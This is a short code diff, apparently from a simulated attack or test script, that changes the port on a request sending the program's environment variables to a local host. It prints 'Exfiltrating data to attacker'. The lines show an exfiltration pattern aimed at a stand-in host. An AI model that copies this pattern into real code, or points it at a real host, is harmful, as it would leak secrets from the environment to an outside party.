@@ -99,7 +99,7 @@ def main():
     try:
         print(env)
         data = parse.urlencode({"data":str(env)}).encode()
-        req =  request.Request("http://localhost", data=data)
+        req =  request.Request("http://localhost:1337", data=data)
         resp = request.urlopen(req)
         print('Exfiltrating data to attacker')
     except Exception:
